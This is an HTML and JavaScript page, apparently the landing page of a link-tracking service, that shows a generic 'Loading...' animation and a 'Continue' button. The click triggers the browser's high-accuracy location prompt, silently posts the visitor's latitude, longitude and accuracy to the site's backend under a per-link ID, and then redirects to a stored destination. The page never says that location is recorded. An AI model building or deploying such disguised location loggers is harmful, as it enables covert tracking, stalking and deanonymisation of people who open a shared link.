<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }

    .container {
      text-align: center;
      padding: 20px;
    }

    /* Dots animation */
    .dots {
      display: inline-flex;
      gap: 8px;
      margin-bottom: 20px;
    }

    .dot {
      width: 12px;
      height: 12px;
      background: #007aff;
      border-radius: 50%;
      animation: bounce 1.4s ease-in-out infinite;
    }

    .dot:nth-child(1) {
      animation-delay: 0s;
    }

    .dot:nth-child(2) {
      animation-delay: 0.2s;
    }

    .dot:nth-child(3) {
      animation-delay: 0.4s;
    }

    @keyframes bounce {
      0%, 60%, 100% {
        transform: translateY(0);
        opacity: 0.3;
      }
      30% {
        transform: translateY(-12px);
        opacity: 1;
      }
    }

    /* Button */
    button {
      background: #007aff;
      color: white;
      border: none;
      padding: 14px 40px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 10px;
      cursor: pointer;
      font-family: inherit;
      transition: opacity 0.2s;
    }

    button:active {
      opacity: 0.8;
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .hidden {
      display: none;
    }
    
    /* For debugging */
    .debug {
      position: fixed;
      bottom: 10px;
      left: 10px;
      font-size: 11px;
      color: #999;
      background: #f5f5f5;
      padding: 5px 10px;
      border-radius: 5px;
      font-family: monospace;
      z-index: 9999;
    }
  </style>
</head>
<body>
<div class="container">
  <!-- Dots animation (shown initially) -->
  <div id="dotsContainer">
    <div class="dots">
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>
  </div>

  <!-- Continue button (hidden initially) -->
  <button id="continueBtn" class="hidden">Continue</button>
</div>

<div class="debug" id="debug"></div>

<script>
  const dotsContainer = document.getElementById('dotsContainer');
  const continueBtn = document.getElementById('continueBtn');
  const debug = document.getElementById('debug');
  
  let isProcessing = false;
  let locationSent = false;
  let redirecting = false;
  
  const linkId = window.location.pathname.split('/').pop() || '';
  let destinationUrl = 'https://google.com';
  
  // Fetch destination URL if API exists
  if (linkId) {
    fetch('/api/hits/' + linkId)
      .then(r => r.json())
      .then(data => {
        if (data && data.dest) destinationUrl = data.dest;
        debug.innerHTML = `✅ Destination loaded: ${destinationUrl}`;
      })
      .catch(() => {
        debug.innerHTML = `⚠️ Using default destination: ${destinationUrl}`;
      });
  }
  
  // Show dots animation
  function showDots() {
    dotsContainer.classList.remove('hidden');
    continueBtn.classList.add('hidden');
  }
  
  // Show continue button
  function showButton() {
    dotsContainer.classList.add('hidden');
    continueBtn.classList.remove('hidden');
    continueBtn.disabled = false;
    continueBtn.textContent = 'Continue';
    isProcessing = false;
  }
  
  // Show loading dots (when requesting location)
  function showLoadingDots() {
    dotsContainer.classList.remove('hidden');
    continueBtn.classList.add('hidden');
  }
  
  // Send location to backend - FIXED: using 'acc' field name (not 'accuracy')
  function sendLocation(lat, lon, acc) {
    if (locationSent) return;
    locationSent = true;
    
    // IMPORTANT: Backend expects 'acc' field, not 'accuracy'
    const payload = {
      lat: lat,
      lon: lon,
      acc: acc  // <-- THIS IS THE KEY FIX! Use 'acc' not 'accuracy'
    };
    
    console.log('📤 Sending to backend:', payload);
    debug.innerHTML = `📤 Sending: lat=${lat}, lon=${lon}, acc=${acc}m`;
    
    fetch('/api/hit/' + linkId, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(res => res.json())
    .then(data => {
      console.log('✅ Server response:', data);
      debug.innerHTML = `✅ Server accepted! Redirecting...`;
    })
    .catch(err => {
      console.log('❌ Send error:', err);
      debug.innerHTML = `❌ Error: ${err.message}`;
    });
  }
  
  // Redirect
  function redirect() {
    if (redirecting) return;
    redirecting = true;
    debug.innerHTML = `🔄 Redirecting to ${destinationUrl}...`;
    setTimeout(() => {
      window.location.href = destinationUrl;
    }, 800);
  }
  
  // Request location permission
  function requestLocation() {
    if (isProcessing) return;
    isProcessing = true;
    
    // Show loading dots
    showLoadingDots();
    debug.innerHTML = '📍 Requesting location permission...';
    
    // Check if geolocation is supported
    if (!navigator.geolocation) {
      debug.innerHTML = '❌ Geolocation not supported';
      showButton();
      return;
    }
    
    // Trigger browser location popup
    navigator.geolocation.getCurrentPosition(
      // Success - User allowed
      function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy; // Accuracy in meters
        const accRounded = Math.round(acc);
        
        // Debug logging
        console.log('📍 Position captured:', {
          latitude: lat,
          longitude: lon,
          accuracy: acc,
          accuracyRounded: accRounded
        });
        
        debug.innerHTML = `✅ Location captured! Lat: ${lat.toFixed(6)}, Lon: ${lon.toFixed(6)}, Acc: ${accRounded}m`;
        
        // Send to backend with accuracy
        sendLocation(lat, lon, accRounded);
        
        // Redirect after a short delay to ensure data is sent
        setTimeout(() => {
          redirect();
        }, 500);
      },
      // Error - User denied or error
      function(error) {
        let errorMsg = '';
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMsg = 'Location access denied';
            break;
          case error.POSITION_UNAVAILABLE:
            errorMsg = 'Position unavailable';
            break;
          case error.TIMEOUT:
            errorMsg = 'Location timeout';
            break;
          default:
            errorMsg = error.message;
        }
        
        console.log('❌ Geolocation error:', errorMsg);
        debug.innerHTML = `❌ ${errorMsg}. Redirecting without location...`;
        
        // Redirect anyway after showing error
        setTimeout(() => {
          redirect();
        }, 1500);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  }
  
  // Show initial dots for 1.5 seconds, then show button
  setTimeout(() => {
    showButton();
    debug.innerHTML = '✅ Ready - Click "Continue" to allow location';
  }, 1500);
  
  // Button click handler
  continueBtn.addEventListener('click', requestLocation);
</script>
</body>
</html>
